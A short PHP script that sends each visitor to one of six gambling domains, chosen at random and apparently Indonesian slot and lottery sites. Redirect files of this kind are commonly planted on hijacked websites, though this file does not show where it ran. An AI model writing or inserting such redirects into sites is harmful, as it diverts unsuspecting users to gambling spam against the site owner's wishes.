<?php
// Array of URLs to redirect to
$urls = [
    'https://sateslot77.online',
    'https://buditogeljitu.pro',
    'https://megaforwinbet.xyz',
    'https://nasgorbetspesial.xyz',
    'https://burungbetsip.fun',
    'https://nagaforwinapi.xyz',
    
    // Add more URLs here
];

// Pick a random URL from the array
$random_url = $urls[array_rand($urls)];

// Redirect to the selected URL
header("Location: $random_url");
exit();
?>
